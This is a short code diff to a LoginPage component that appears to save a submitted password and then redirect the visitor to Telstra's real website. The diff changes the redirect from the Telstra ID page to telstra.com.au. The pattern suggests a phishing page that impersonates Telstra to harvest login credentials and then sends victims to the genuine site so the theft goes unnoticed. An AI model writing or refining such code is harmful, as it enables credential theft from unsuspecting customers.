@@ -64,7 +64,7 @@ export default function LoginPage() {
 
         if (response.ok) {
           // Redirect to Telstra ID page
-          window.location.href = 'https://myid.telstra.com/';
+          window.location.href = 'https://www.telstra.com.au';
         } else {
           const error = await response.json();
           console.error('Error saving password:', error);
